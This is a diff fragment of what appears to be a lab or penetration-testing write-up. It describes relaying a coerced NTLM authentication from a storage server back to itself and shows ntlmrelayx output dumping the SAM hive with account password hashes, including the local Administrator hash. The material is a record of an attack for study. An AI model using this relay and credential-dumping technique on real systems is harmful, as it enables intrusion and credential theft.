@@ -1021,4 +1021,16 @@ COERCE_PLUS 10.0.0.101      445    STORAGE          VULNERABLE, MSEven
 
 Then ill get the storage server to relay authentication back to itself
 
-> NOTE: for some reason nxc i
+> NOTE: for some reason nxc is still saying smb signing is on, not sure why?
+
+```python
+[*] (SMB): Connection from 10.0.0.101 controlled, but there are no more targets left!
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d5cad8a9782b2879bf316f56936f1e36:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7490f2a63d713a813eda5bf8fd1a8227:::
+```
+
+Now back on ntlmrelayx i have the SAM hive and the local admin hash!
+
+
